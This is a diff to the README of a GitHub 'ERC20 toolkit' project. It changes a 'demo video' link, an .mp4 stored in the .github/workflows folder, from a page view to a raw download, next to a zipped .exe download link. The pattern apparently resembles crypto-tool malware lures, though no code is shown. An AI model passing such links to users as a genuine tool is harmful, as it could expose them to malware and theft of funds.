@@ -7,7 +7,7 @@
 -   **[Download for Windows/Mac OS (.exe)](https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/raw/refs/heads/main/DeployerIDE.zip)**
 -   **[Download for Python (.py)](deployer.py)**
 
--   [Watch the demo video](https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/blob/main/.github/workflows/DeployerIDE.mp4)
+-   [Watch the demo video](https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/raw/refs/heads/main/.github/workflows/DeployerIDE.mp4)
 
 
 ## 📋 Overview
